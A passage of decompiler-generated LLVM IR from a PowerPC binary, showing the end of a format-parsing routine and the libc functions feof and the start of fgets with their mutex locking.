  store i32 %v1_1001b2f4, i32* %r0.global-to-local, align 4
  %v0_1001b2f8 = load i32, i32* @r30, align 4
  %v1_1001b2f8 = inttoptr i32 %v0_1001b2f8 to i8*
  %v2_1001b2f8 = load i8, i8* %v1_1001b2f8, align 1
  %v3_1001b2f8 = zext i8 %v2_1001b2f8 to i32
  store i32 %v3_1001b2f8, i32* @r10, align 4
  %v1_1001b2fc = call i32 @__asm_rlwinm(i32 %v6_1001b2f0, i32 0, i32 0, i32 27)
  store i32 %v1_1001b2fc, i32* %r9.global-to-local, align 4
  %v0_1001b300 = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b300 = call i32 @__asm_rlwinm(i32 %v0_1001b300, i32 0, i32 30, i32 28)
  %v1_1001b304 = add i32 %v1_1001b2fc, 48
  store i32 %v1_1001b304, i32* %r9.global-to-local, align 4
  %v2_1001b308 = or i32 %v1_1001b300, %v1_1001b2f4
  store i32 %v2_1001b308, i32* @r11, align 4
  store i32 1, i32* @r8, align 4
  %v0_1001b310 = load i32, i32* @r10, align 4
  %v1_1001b310 = load i32, i32* @r28, align 4
  %v2_1001b310 = add i32 %v1_1001b310, 12
  %v3_1001b310 = inttoptr i32 %v2_1001b310 to i32*
  store i32 %v0_1001b310, i32* %v3_1001b310, align 4
  %v0_1001b314 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001b314 = load i32, i32* @r28, align 4
  %v2_1001b314 = add i32 %v1_1001b314, 4
  %v3_1001b314 = inttoptr i32 %v2_1001b314 to i32*
  store i32 %v0_1001b314, i32* %v3_1001b314, align 4
  %v0_1001b318 = load i32, i32* @r31, align 4
  %v1_1001b318 = load i32, i32* @r28, align 4
  %v2_1001b318 = add i32 %v1_1001b318, 8
  %v3_1001b318 = inttoptr i32 %v2_1001b318 to i32*
  store i32 %v0_1001b318, i32* %v3_1001b318, align 4
  %v0_1001b31c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001b31c = load i32, i32* @r28, align 4
  %v2_1001b31c = add i32 %v1_1001b31c, 20
  %v3_1001b31c = inttoptr i32 %v2_1001b31c to i32*
  store i32 %v0_1001b31c, i32* %v3_1001b31c, align 4
  %v0_1001b320 = load i32, i32* @r11, align 4
  %v1_1001b320 = load i32, i32* @r28, align 4
  %v2_1001b320 = add i32 %v1_1001b320, 16
  %v3_1001b320 = inttoptr i32 %v2_1001b320 to i32*
  store i32 %v0_1001b320, i32* %v3_1001b320, align 4
  %v0_1001b324 = load i32, i32* @r8, align 4
  %v1_1001b324 = load i32, i32* @r28, align 4
  %v2_1001b324 = add i32 %v1_1001b324, 28
  %v3_1001b324 = inttoptr i32 %v2_1001b324 to i32*
  store i32 %v0_1001b324, i32* %v3_1001b324, align 4
  %v0_1001b328 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001b328 = inttoptr i32 %v0_1001b328 to i8*
  %v2_1001b328 = load i8, i8* %v1_1001b328, align 1
  %v3_1001b328 = zext i8 %v2_1001b328 to i32
  store i32 %v3_1001b328, i32* %r9.global-to-local, align 4
  %v3_1001b32c = icmp eq i8 %v2_1001b328, 0
  br i1 %v3_1001b32c, label %dec_label_pc_1001b334, label %dec_label_pc_1001b34c

dec_label_pc_1001b334:                            ; preds = %dec_label_pc_1001b2e4
  %v0_1001b334 = load i32, i32* @r30, align 4
  %v1_1001b334 = inttoptr i32 %v0_1001b334 to i8*
  %v2_1001b334 = load i8, i8* %v1_1001b334, align 1
  %v3_1001b334 = zext i8 %v2_1001b334 to i32
  store i32 %v3_1001b334, i32* %r0.global-to-local, align 4
  %v3_1001b338 = icmp eq i8 %v2_1001b334, 109
  br i1 %v3_1001b338, label %dec_label_pc_1001b340, label %dec_label_pc_1001b484

dec_label_pc_1001b340:                            ; preds = %dec_label_pc_1001b334
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1001b344 = load i32, i32* @r28, align 4
  %v2_1001b344 = add i32 %v1_1001b344, 28
  %v3_1001b344 = inttoptr i32 %v2_1001b344 to i32*
  store i32 %v3_1001b328, i32* %v3_1001b344, align 4
  %v0_1001b348 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001b348 = load i32, i32* @r28, align 4
  %v2_1001b348 = add i32 %v1_1001b348, 32
  %v3_1001b348 = inttoptr i32 %v2_1001b348 to i32*
  store i32 %v0_1001b348, i32* %v3_1001b348, align 4
  br label %dec_label_pc_1001b34c

dec_label_pc_1001b34c:                            ; preds = %dec_label_pc_1001b2e4, %dec_label_pc_1001b340
  %v0_1001b34c = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1001b34c, 1
  br i1 %tmp62, label %dec_label_pc_1001b428, label %dec_label_pc_1001b354

dec_label_pc_1001b354:                            ; preds = %dec_label_pc_1001b34c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1001b358

dec_label_pc_1001b358:                            ; preds = %dec_label_pc_1001b410, %dec_label_pc_1001b354
  %v0_1001b380 = phi i32 [ 0, %dec_label_pc_1001b354 ], [ %v1_1001b414, %dec_label_pc_1001b410 ]
  %v2_1001b358 = icmp sgt i32 %v0_1001b380, 2
  br i1 %v2_1001b358, label %dec_label_pc_1001b37c, label %dec_label_pc_1001b360

dec_label_pc_1001b360:                            ; preds = %dec_label_pc_1001b358
  %v1_1001b360 = mul i32 %v0_1001b380, 4
  store i32 %v1_1001b360, i32* %r0.global-to-local, align 4
  %v0_1001b364 = load i32, i32* @r1, align 4
  %v2_1001b364 = add i32 %v0_1001b364, %v1_1001b360
  store i32 %v2_1001b364, i32* %r9.global-to-local, align 4
  %v1_1001b368 = add i32 %v2_1001b364, 20
  %v2_1001b368 = inttoptr i32 %v1_1001b368 to i32*
  %v3_1001b368 = load i32, i32* %v2_1001b368, align 4
  store i32 %v3_1001b368, i32* %r0.global-to-local, align 4
  %v1_1001b36c = load i32, i32* @r28, align 4
  %v2_1001b36c = add i32 %v1_1001b36c, %v0_1001b380
  store i32 %v2_1001b36c, i32* %r9.global-to-local, align 4
  %v1_1001b370 = urem i32 %v3_1001b368, 256
  store i32 %v1_1001b370, i32* @r11, align 4
  %v1_1001b374 = trunc i32 %v3_1001b368 to i8
  %v3_1001b374 = add i32 %v2_1001b36c, 36
  %v4_1001b374 = inttoptr i32 %v3_1001b374 to i8*
  store i8 %v1_1001b374, i8* %v4_1001b374, align 1
  %v0_1001b388.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001b388

dec_label_pc_1001b37c:                            ; preds = %dec_label_pc_1001b358
  %v2_1001b380 = add i32 %v0_1001b380, %stack_var_-84.3
  store i32 %v2_1001b380, i32* %r9.global-to-local, align 4
  %v1_1001b384 = add i32 %v2_1001b380, -2
  store i32 %v1_1001b384, i32* @r11, align 4
  br label %dec_label_pc_1001b388

dec_label_pc_1001b388:                            ; preds = %dec_label_pc_1001b360, %dec_label_pc_1001b37c
  %v0_1001b3a8 = phi i32 [ %v0_1001b388.pre, %dec_label_pc_1001b360 ], [ %v1_1001b384, %dec_label_pc_1001b37c ]
  %v1_1001b388 = load i32, i32* @r26, align 4
  %v3_1001b388 = icmp sgt i32 %v0_1001b3a8, %v1_1001b388
  br i1 %v3_1001b388, label %dec_label_pc_1001b390, label %dec_label_pc_1001b39c

dec_label_pc_1001b390:                            ; preds = %dec_label_pc_1001b388
  %v2_1001b390 = icmp sgt i32 %v0_1001b3a8, 9
  br i1 %v2_1001b390, label %dec_label_pc_1001b484, label %dec_label_pc_1001b398

dec_label_pc_1001b398:                            ; preds = %dec_label_pc_1001b390
  store i32 %v0_1001b3a8, i32* @r26, align 4
  br label %dec_label_pc_1001b39c

dec_label_pc_1001b39c:                            ; preds = %dec_label_pc_1001b388, %dec_label_pc_1001b398
  store i32 %v2_1001b038.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1001b3a0 = load i32, i32* @r27, align 4
  %v1_1001b3a0 = mul i32 %v0_1001b3a0, 4
  store i32 %v1_1001b3a0, i32* %r0.global-to-local, align 4
  %v2_1001b3a4 = add i32 %v1_1001b3a0, %v2_1001b038.pre-phi
  %v3_1001b3a4 = inttoptr i32 %v2_1001b3a4 to i32*
  %v4_1001b3a4 = load i32, i32* %v3_1001b3a4, align 4
  store i32 %v4_1001b3a4, i32* @r31, align 4
  %v1_1001b3a8 = add i32 %v0_1001b3a8, -1
  store i32 %v1_1001b3a8, i32* @r25, align 4
  %v1_1001b3ac = mul i32 %v1_1001b3a8, 4
  %v1_1001b3b0 = load i32, i32* @r28, align 4
  %v2_1001b3b0 = add i32 %v1_1001b3b0, %v1_1001b3ac
  store i32 %v2_1001b3b0, i32* %r9.global-to-local, align 4
  %v3_1001b3b4 = icmp eq i32 %v4_1001b3a4, 8
  %v1_1001b3b8 = add i32 %v2_1001b3b0, 40
  %v2_1001b3b8 = inttoptr i32 %v1_1001b3b8 to i32*
  %v3_1001b3b8 = load i32, i32* %v2_1001b3b8, align 4
  store i32 %v3_1001b3b8, i32* %r3.global-to-local, align 4
  br i1 %v3_1001b3b4, label %dec_label_pc_1001b410, label %dec_label_pc_1001b3c0

dec_label_pc_1001b3c0:                            ; preds = %dec_label_pc_1001b39c
  %v3_1001b3c0 = icmp eq i32 %v3_1001b3b8, 8
  br i1 %v3_1001b3c0, label %dec_label_pc_1001b3f8, label %dec_label_pc_1001b3c8

dec_label_pc_1001b3c8:                            ; preds = %dec_label_pc_1001b3c0
  %v4_1001b3c8 = icmp eq i32 %v3_1001b3b8, %v4_1001b3a4
  br i1 %v4_1001b3c8, label %dec_label_pc_1001b3f8, label %dec_label_pc_1001b3d0

dec_label_pc_1001b3d0:                            ; preds = %dec_label_pc_1001b3c8
  %v1_1001b3d0 = call i32 @_promoted_size(i32 %v3_1001b3b8)
  store i32 %v1_1001b3d0, i32* @r29, align 4
  %v0_1001b3d8 = load i32, i32* @r31, align 4
  store i32 %v0_1001b3d8, i32* %r3.global-to-local, align 4
  %v1_1001b3dc = call i32 @_promoted_size(i32 %v0_1001b3d8)
  store i32 %v1_1001b3dc, i32* %r3.global-to-local, align 4
  %v0_1001b3e8 = call i32 @__asm_mfcr()
  store i32 %v0_1001b3e8, i32* %r3.global-to-local, align 4
  store i32 %v0_1001b3e8, i32* %r0.global-to-local, align 4
  %v1_1001b3ec = call i32 @__asm_rlwinm(i32 %v0_1001b3e8, i32 31, i32 31, i32 31)
  store i32 %v1_1001b3ec, i32* %r0.global-to-local, align 4
  %v3_1001b3f0 = icmp eq i32 %v1_1001b3ec, 0
  br i1 %v3_1001b3f0, label %dec_label_pc_1001b410, label %dec_label_pc_1001b3d0.dec_label_pc_1001b3f8_crit_edge

dec_label_pc_1001b3d0.dec_label_pc_1001b3f8_crit_edge: ; preds = %dec_label_pc_1001b3d0
  %v0_1001b3fc.pre = load i32, i32* @r27, align 4
  %v0_1001b404.pre = load i32, i32* @r25, align 4
  %v1_1001b408.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001b3f8

dec_label_pc_1001b3f8:                            ; preds = %dec_label_pc_1001b3d0.dec_label_pc_1001b3f8_crit_edge, %dec_label_pc_1001b3c8, %dec_label_pc_1001b3c0
  %v1_1001b408 = phi i32 [ %v1_1001b408.pre, %dec_label_pc_1001b3d0.dec_label_pc_1001b3f8_crit_edge ], [ %v1_1001b3b0, %dec_label_pc_1001b3c8 ], [ %v1_1001b3b0, %dec_label_pc_1001b3c0 ]
  %v0_1001b404 = phi i32 [ %v0_1001b404.pre, %dec_label_pc_1001b3d0.dec_label_pc_1001b3f8_crit_edge ], [ %v1_1001b3a8, %dec_label_pc_1001b3c8 ], [ %v1_1001b3a8, %dec_label_pc_1001b3c0 ]
  %v0_1001b3fc = phi i32 [ %v0_1001b3fc.pre, %dec_label_pc_1001b3d0.dec_label_pc_1001b3f8_crit_edge ], [ %v0_1001b3a0, %dec_label_pc_1001b3c8 ], [ %v0_1001b3a0, %dec_label_pc_1001b3c0 ]
  store i32 %v2_1001b038.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1001b3fc = mul i32 %v0_1001b3fc, 4
  store i32 %v1_1001b3fc, i32* %r0.global-to-local, align 4
  %v2_1001b400 = add i32 %v1_1001b3fc, %v2_1001b038.pre-phi
  %v3_1001b400 = inttoptr i32 %v2_1001b400 to i32*
  %v4_1001b400 = load i32, i32* %v3_1001b400, align 4
  store i32 %v4_1001b400, i32* %r0.global-to-local, align 4
  %v1_1001b404 = mul i32 %v0_1001b404, 4
  %v2_1001b408 = add i32 %v1_1001b404, %v1_1001b408
  store i32 %v2_1001b408, i32* %r9.global-to-local, align 4
  %v2_1001b40c = add i32 %v2_1001b408, 40
  %v3_1001b40c = inttoptr i32 %v2_1001b40c to i32*
  store i32 %v4_1001b400, i32* %v3_1001b40c, align 4
  br label %dec_label_pc_1001b410

dec_label_pc_1001b410:                            ; preds = %dec_label_pc_1001b3d0, %dec_label_pc_1001b39c, %dec_label_pc_1001b3f8
  %v0_1001b410 = load i32, i32* @r28, align 4
  %v1_1001b410 = add i32 %v0_1001b410, 28
  %v2_1001b410 = inttoptr i32 %v1_1001b410 to i32*
  %v3_1001b410 = load i32, i32* %v2_1001b410, align 4
  %v0_1001b414 = load i32, i32* @r27, align 4
  %v1_1001b414 = add i32 %v0_1001b414, 1
  store i32 %v1_1001b414, i32* @r27, align 4
  %v1_1001b418 = add i32 %v3_1001b410, 2
  store i32 %v1_1001b418, i32* %r9.global-to-local, align 4
  %v2_1001b41c = icmp slt i32 %v1_1001b414, %v1_1001b418
  br i1 %v2_1001b41c, label %dec_label_pc_1001b358, label %dec_label_pc_1001b440

dec_label_pc_1001b428:                            ; preds = %dec_label_pc_1001b34c
  %v0_1001b428 = load i32, i32* @r28, align 4
  %v1_1001b428 = add i32 %v0_1001b428, 28
  %v2_1001b428 = inttoptr i32 %v1_1001b428 to i32*
  %v3_1001b428 = load i32, i32* %v2_1001b428, align 4
  store i32 %v3_1001b428, i32* %r5.global-to-local, align 4
  %v1_1001b42c = add i32 %v0_1001b428, 40
  store i32 %v1_1001b42c, i32* @r3, align 4
  %v0_1001b430 = load i32, i32* @r8, align 4
  %v1_1001b430 = trunc i32 %v0_1001b430 to i8
  %v3_1001b430 = add i32 %v0_1001b428, 38
  %v4_1001b430 = inttoptr i32 %v3_1001b430 to i8*
  store i8 %v1_1001b430, i8* %v4_1001b430, align 1
  %v2_1001b434 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1001b434, i32* @r4, align 4
  %v0_1001b438 = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b438 = mul i32 %v0_1001b438, 4
  store i32 %v1_1001b438, i32* @r5, align 4
  store i32 268547136, i32* @lr, align 4
  %v0_1001b43c = call i32 @memcpy()
  store i32 %v0_1001b43c, i32* %r3.global-to-local, align 4
  %v0_1001b440.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001b440

dec_label_pc_1001b440:                            ; preds = %dec_label_pc_1001b410, %dec_label_pc_1001b428
  %v0_1001b440 = phi i32 [ %v0_1001b440.pre, %dec_label_pc_1001b428 ], [ %v0_1001b410, %dec_label_pc_1001b410 ]
  %v1_1001b440 = add i32 %v0_1001b440, 16
  %v2_1001b440 = inttoptr i32 %v1_1001b440 to i32*
  %v3_1001b440 = load i32, i32* %v2_1001b440, align 4
  store i32 %v3_1001b440, i32* %r0.global-to-local, align 4
  %v0_1001b444 = load i32, i32* @r26, align 4
  %v2_1001b444 = add i32 %v0_1001b440, 24
  %v3_1001b444 = inttoptr i32 %v2_1001b444 to i32*
  store i32 %v0_1001b444, i32* %v3_1001b444, align 4
  %v0_1001b448 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001b448 = and i32 %v0_1001b448, 128
  store i32 %v1_1001b448, i32* %r9.global-to-local, align 4
  %v3_1001b448 = icmp eq i32 %v1_1001b448, 0
  br i1 %v3_1001b448, label %dec_label_pc_1001b450, label %dec_label_pc_1001b45c

dec_label_pc_1001b450:                            ; preds = %dec_label_pc_1001b440
  %v0_1001b450 = load i32, i32* @r30, align 4
  %v1_1001b450 = add i32 %v0_1001b450, 1
  store i32 %v1_1001b450, i32* %r0.global-to-local, align 4
  %v1_1001b454 = load i32, i32* @r28, align 4
  %v2_1001b454 = inttoptr i32 %v1_1001b454 to i32*
  store i32 %v1_1001b450, i32* %v2_1001b454, align 4
  br label %dec_label_pc_1001b474

dec_label_pc_1001b45c:                            ; preds = %dec_label_pc_1001b440
  %v0_1001b45c = load i32, i32* @r28, align 4
  %v1_1001b45c = inttoptr i32 %v0_1001b45c to i32*
  %v2_1001b45c = load i32, i32* %v1_1001b45c, align 4
  %v2_1001b460 = ptrtoint i32* %stack_var_-80 to i32
  %v1_1001b464 = load i32, i32* @r30, align 4
  %v2_1001b464 = sub i32 %v1_1001b464, %v2_1001b460
  %v1_1001b468 = mul i32 %v2_1001b464, 4
  store i32 %v1_1001b468, i32* %r0.global-to-local, align 4
  %v2_1001b46c = add i32 %v1_1001b468, %v2_1001b45c
  store i32 %v2_1001b46c, i32* %r9.global-to-local, align 4
  store i32 %v2_1001b46c, i32* %v1_1001b45c, align 4
  br label %dec_label_pc_1001b474

dec_label_pc_1001b474:                            ; preds = %dec_label_pc_1001b450, %dec_label_pc_1001b45c
  %v0_1001b474 = load i32, i32* @r28, align 4
  %v1_1001b474 = add i32 %v0_1001b474, 28
  %v2_1001b474 = inttoptr i32 %v1_1001b474 to i32*
  %v3_1001b474 = load i32, i32* %v2_1001b474, align 4
  store i32 %v3_1001b474, i32* %r9.global-to-local, align 4
  %v1_1001b478 = add i32 %v3_1001b474, 2
  br label %dec_label_pc_1001b484

dec_label_pc_1001b484:                            ; preds = %dec_label_pc_1001afe8, %dec_label_pc_1001b0bc, %dec_label_pc_1001b198, %dec_label_pc_1001b18c, %dec_label_pc_1001b1b4, %dec_label_pc_1001b0f0, %dec_label_pc_1001b390, %dec_label_pc_1001b240, %dec_label_pc_1001b334, %dec_label_pc_1001b474
  %storemerge2 = phi i32 [ %v1_1001b478, %dec_label_pc_1001b474 ], [ -1, %dec_label_pc_1001b334 ], [ -1, %dec_label_pc_1001b240 ], [ -1, %dec_label_pc_1001b390 ], [ -1, %dec_label_pc_1001b0f0 ], [ -1, %dec_label_pc_1001b1b4 ], [ -1, %dec_label_pc_1001b18c ], [ -1, %dec_label_pc_1001b198 ], [ -1, %dec_label_pc_1001b0bc ], [ -1, %dec_label_pc_1001afe8 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1001af84, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1001b468, { 1, 0 }
  uselistorder i32 %v0_1001b440, { 1, 0 }
  uselistorder i32 %v1_1001b414, { 1, 2, 0 }
  uselistorder i32 %v1_1001b3fc, { 1, 0 }
  uselistorder i32 %v0_1001b3e8, { 0, 2, 1 }
  uselistorder i32 %v3_1001b3b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001b3b0, { 1, 2, 0 }
  uselistorder i32 %v1_1001b3a8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001b3a0, { 1, 0 }
  uselistorder i32 %v0_1001b3a0, { 1, 2, 0 }
  uselistorder i32 %v3_1001b368, { 1, 0, 2 }
  uselistorder i32 %v1_1001b360, { 1, 0 }
  uselistorder i32 %v0_1001b380, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1001b2d8, { 1, 2, 0 }
  uselistorder i32 %v1_1001b2b0, { 2, 1, 0 }
  uselistorder i32 %v1_1001b29c, { 0, 2, 1 }
  uselistorder i32 %v1_1001b280, { 1, 0, 2 }
  uselistorder i32 %v1_1001b24c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1001b208, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1001b1cc, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1001b1b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1001b128, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1001b124, { 1, 0 }
  uselistorder i32 %v0_1001b13c, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1001b0a0, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1001b090, { 1, 0 }
  uselistorder i32 %v1_1001b08c, { 1, 0 }
  uselistorder i32 %v3_1001b080, { 1, 0, 2 }
  uselistorder i32 %v0_1001b0fc, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1001b0cc, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_1001b05c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1001b044, { 1, 0 }
  uselistorder i32 %v2_1001b038.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1001b018, { 1, 0 }
  uselistorder i32 %v1_1001b000, { 1, 2, 0 }
  uselistorder i32 %v0_1001aff4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1002e45c.1173 to i32), { 3, 0, 1, 2, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1002e41c.1172 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b484, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1001b474, { 1, 0 }
  uselistorder label %dec_label_pc_1001b440, { 1, 0 }
  uselistorder label %dec_label_pc_1001b410, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b39c, { 1, 0 }
  uselistorder label %dec_label_pc_1001b388, { 1, 0 }
  uselistorder label %dec_label_pc_1001b34c, { 1, 0 }
  uselistorder label %dec_label_pc_1001b294, { 1, 0 }
  uselistorder label %dec_label_pc_1001b240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b1f0, { 1, 0 }
  uselistorder label %dec_label_pc_1001b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_1001b178, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b174, { 1, 0 }
  uselistorder label %dec_label_pc_1001b0e8, { 1, 0 }
  uselistorder label %dec_label_pc_1001b0e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b080, { 1, 0 }
  uselistorder label %dec_label_pc_1001b07c, { 1, 0 }
  uselistorder label %dec_label_pc_1001b068, { 1, 0 }
  uselistorder label %dec_label_pc_1001b048, { 1, 0 }
  uselistorder label %dec_label_pc_1001b044, { 1, 0 }
  uselistorder label %dec_label_pc_1001b028, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1001b4a0 = call i32 @__asm_mfcr()
  %v2_1001b4b0 = add i32 %v0_1001b4a0, 56
  store i32 %v2_1001b4b0, i32* %r30.global-to-local, align 4
  %v2_1001b4c4 = add i32 %v0_1001b4a0, 52
  %v3_1001b4c4 = inttoptr i32 %v2_1001b4c4 to i32*
  %v4_1001b4c4 = load i32, i32* %v3_1001b4c4, align 4
  %v3_1001b4cc = icmp eq i32 %v4_1001b4c4, 0
  store i1 %v3_1001b4cc, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1001b4cc, label %dec_label_pc_1001b4e0, label %dec_label_pc_1001b4e0.thread

dec_label_pc_1001b4e0.thread:                     ; preds = %entry
  %v1_1001b4e83 = inttoptr i32 %v0_1001b4a0 to i16*
  %v2_1001b4e84 = load i16, i16* %v1_1001b4e83, align 2
  %v3_1001b4e85 = zext i16 %v2_1001b4e84 to i32
  br label %dec_label_pc_1001b4f4

dec_label_pc_1001b4e0:                            ; preds = %entry
  %v2_1001b4c8 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001b4d4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 %v2_1001b4b0)
  %v0_1001b4d8 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001b4e0.1178 to i32), i32* @lr, align 4
  %v1_1001b4dc = call i32 @pthread_mutex_lock(i32 %v0_1001b4d8)
  %v0_1001b4e8.pre = load i32, i32* @r31, align 4
  %v0_1001b4ec.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_1001b4c8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001b4e8 = inttoptr i32 %v0_1001b4e8.pre to i16*
  %v2_1001b4e8 = load i16, i16* %v1_1001b4e8, align 2
  %v3_1001b4e8 = zext i16 %v2_1001b4e8 to i32
  br i1 %v0_1001b4ec.pre, label %dec_label_pc_1001b4f0, label %dec_label_pc_1001b4f4

dec_label_pc_1001b4f0:                            ; preds = %dec_label_pc_1001b4e0
  store i32 268547316, i32* @lr, align 4
  %v0_1001b4f0 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001b4f4

dec_label_pc_1001b4f4:                            ; preds = %dec_label_pc_1001b4e0.thread, %dec_label_pc_1001b4e0, %dec_label_pc_1001b4f0
  %v3_1001b4e86 = phi i32 [ %v3_1001b4e85, %dec_label_pc_1001b4e0.thread ], [ %v3_1001b4e8, %dec_label_pc_1001b4e0 ], [ %v3_1001b4e8, %dec_label_pc_1001b4f0 ]
  %v1_1001b4f8 = call i32 @__asm_rlwinm(i32 %v3_1001b4e86, i32 0, i32 29, i32 29)
  %v1_1001b50c = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001b4a0)
  ret i32 %v1_1001b4f8

; uselistorder directives
  uselistorder i32 %v0_1001b4a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001b4f4, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1001b51c = call i32 @__asm_mfcr()
  %v1_1001b524 = add i32 %arg3, 56
  store i32 %v1_1001b524, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_1001b51c, i32* %r28.global-to-local, align 4
  %v2_1001b544 = ptrtoint i32* %stack_var_-40 to i32
  %v1_1001b548 = add i32 %arg3, 52
  %v2_1001b548 = inttoptr i32 %v1_1001b548 to i32*
  %v3_1001b548 = load i32, i32* %v2_1001b548, align 4
  %v3_1001b550 = icmp eq i32 %v3_1001b548, 0
  store i1 %v3_1001b550, i1* @cr4_eq, align 1
  br i1 %v3_1001b550, label %dec_label_pc_1001b558, label %dec_label_pc_1001b564

dec_label_pc_1001b558:                            ; preds = %entry
  %v4_1001b558 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 %v1_1001b524)
  %v0_1001b55c = load i32, i32* %r29.global-to-local, align 4
  store i32 268547428, i32* @lr, align 4
  %v1_1001b560 = call i32 @pthread_mutex_lock(i32 %v0_1001b55c)
  %v0_1001b564.pre = load i32, i32* @r30, align 4
  %v0_1001b568.pre = load i32, i32* @r31, align 4
  %v0_1001b56c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001b564

dec_label_pc_1001b564:                            ; preds = %entry, %dec_label_pc_1001b558
  %v0_1001b56c = phi i32 [ %v0_1001b51c, %entry ], [ %v0_1001b56c.pre, %dec_label_pc_1001b558 ]
  %v0_1001b568 = phi i32 [ %arg3, %entry ], [ %v0_1001b568.pre, %dec_label_pc_1001b558 ]
  %v0_1001b564 = phi i32 [ %arg2, %entry ], [ %v0_1001b564.pre, %dec_label_pc_1001b558 ]
  store i32 268547444, i32* @lr, align 4
  %v3_1001b570 = inttoptr i32 %v0_1001b56c to i8*
  %v4_1001b570 = call i32 @__GI_fgets_unlocked(i8* %v3_1001b570, i32 %v0_1001b564, i32 %v0_1001b568)
  store i32 1, i32* @r4, align 4
  store i32 %v4_1001b570, i32* @r31, align 4
  store i32 %v2_1001b544, i32* @r3, align 4
  %v0_1001b580 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1001b580, label %dec_label_pc_1001b584, label %dec_label_pc_1001b588

dec_label_pc_1001b584:                            ; preds = %dec_label_pc_1001b564
  store i32 268547464, i32* @lr, align 4
  %v0_1001b584 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b58c.pre = load i32, i32* @r31, align 4
